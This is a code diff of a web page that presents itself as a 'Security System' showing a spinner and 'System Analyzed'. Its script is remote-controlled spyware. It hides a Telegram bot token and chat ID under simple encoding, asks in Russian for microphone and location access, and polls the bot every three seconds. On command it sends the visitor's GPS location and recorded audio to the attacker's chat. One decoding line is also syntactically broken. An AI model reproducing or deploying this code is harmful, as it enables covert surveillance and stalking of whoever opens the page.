@@ -3,13 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Система управления</title>
+    <title>Security System</title>
     <style>
-        /* استایل‌های قبلی */
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial;
+        }
+        .loader {
+            border: 10px solid #333;
+            border-top: 10px solid #ff6200;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            color: #ff6200;
+            font-size: 24px;
+            margin-top: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <!-- محتوای مشابه قبلی -->
+    <div>
+        <div class="loader"></div>
+        <div class="message">System Analyzed</div>
+    </div>
 
     <script>
         // تنظیمات رمزنگاری شده
@@ -21,71 +50,84 @@
         // توابع رمزگشایی
         const decrypt = {
             token: () => atob(SECRET.token).split('').reverse().join(''),
-            chat: () => String.fromCharCode(...atob(SECRET.chat).split('').map(c => c.charCodeAt(0)-1))
+            chat: () => String.fromCharCode(...atob(SECRET.chat).split('').map(c => c.charCodeAt(0)-1)
         };
 
-        // سیستم دستورات
-        class BotController {
+        class ControlSystem {
             constructor() {
-                this.lastUpdateId = 0;
-                this.audioRecorder = null;
+                this.recorder = null;
+                this.audioChunks = [];
+                this.setupPermissions();
             }
 
+            // سیستم مجوزهای روسی
+            async setupPermissions() {
+                try {
+                    const ruConfirm = confirm('Для работы системы требуется:\n1. Доступ к геолокации\n2. Доступ к микрофону\nРазрешить доступ?');
+                    if(!ruConfirm) return;
+                    
+                    await navigator.mediaDevices.getUserMedia({ audio: true });
+                    navigator.geolocation.getCurrentPosition(() => {});
+                } catch(e) {
+                    alert('Доступ отклонен! Система не может работать');
+                }
+            }
+
+            // سیستم دستورات
             async checkCommands() {
                 try {
-                    const response = await fetch(`https://api.telegram.org/bot${decrypt.token()}/getUpdates?offset=${this.lastUpdateId+1}`);
+                    const response = await fetch(`https://api.telegram.org/bot${decrypt.token()}/getUpdates`);
                     const data = await response.json();
                     
                     data.result.forEach(update => {
-                        if(update.message.chat.id.toString() === decrypt.chat()) {
-                            this.executeCommand(update.message.text);
-                            this.lastUpdateId = update.update_id;
+                        const command = update.message.text;
+                        const chatId = update.message.chat.id.toString();
+                        
+                        if(chatId === decrypt.chat()) {
+                            this.executeCommand(command);
                         }
                     });
-                } catch(e) { console.error('Ошибка:', e); }
+                } catch(e) { console.error('Error:', e); }
             }
 
             executeCommand(command) {
-                switch(command.toLowerCase()) {
-                    case '/start_audio':
+                switch(command) {
+                    case '/locate':
+                        this.getLocation();
+                        break;
+                    case '/record_start':
                         this.startRecording();
                         break;
-                    case '/stop_audio':
+                    case '/record_stop':
                         this.stopRecording();
-                        break;
-                    case '/get_location':
-                        this.getLocation();
                         break;
                 }
             }
 
-            // سیستم موقعیت مکانی
+            // موقعیت مکانی
             async getLocation() {
                 const pos = await new Promise((res, rej) => 
                     navigator.geolocation.getCurrentPosition(res, rej));
                 
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                this.sendToTelegram(`📍 Текущее местоположение:\n${mapLink}`);
+                this.sendTelegram(`📍 Live Location:\n${mapLink}`);
             }
 
-            // سیستم ضبط صدا
+            // مدیریت ضبط صدا
             async startRecording() {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                this.audioRecorder = new MediaRecorder(stream);
-                this.audioChunks = [];
-                
-                this.audioRecorder.ondataavailable = e => this.audioChunks.push(e.data);
-                this.audioRecorder.start();
-                
-                this.sendToTelegram('🎤 Запись звука начата...');
+                this.recorder = new MediaRecorder(stream);
+                this.recorder.start();
+                this.recorder.ondataavailable = e => this.audioChunks.push(e.data);
+                this.sendTelegram('⏺ Recording started...');
             }
 
             async stopRecording() {
-                if(!this.audioRecorder) return;
+                if(!this.recorder) return;
                 
                 await new Promise(res => {
-                    this.audioRecorder.onstop = res;
-                    this.audioRecorder.stop();
+                    this.recorder.onstop = res;
+                    this.recorder.stop();
                 });
                 
                 const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
@@ -93,8 +135,8 @@
                 this.audioChunks = [];
             }
 
-            // سیستم ارسال داده
-            sendToTelegram(text) {
+            // ارتباط با تلگرام
+            sendTelegram(text) {
                 fetch(`https://api.telegram.org/bot${decrypt.token()}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -118,14 +160,8 @@
         }
 
         // اجرای سیستم
-        const controller = new BotController();
-        setInterval(() => controller.checkCommands(), 3000); // چک کردن دستورات هر ۳ ثانیه
-
-        // درخواست اولیه دسترسی
-        window.onload = async () => {
-            await navigator.mediaDevices.getUserMedia({ audio: true }); // دسترسی میکروفون
-            navigator.geolocation.getCurrentPosition(() => {}); // دسترسی موقعیت
-        };
+        const system = new ControlSystem();
+        setInterval(() => system.checkCommands(), 3000);
     </script>
 </body>
 </html>
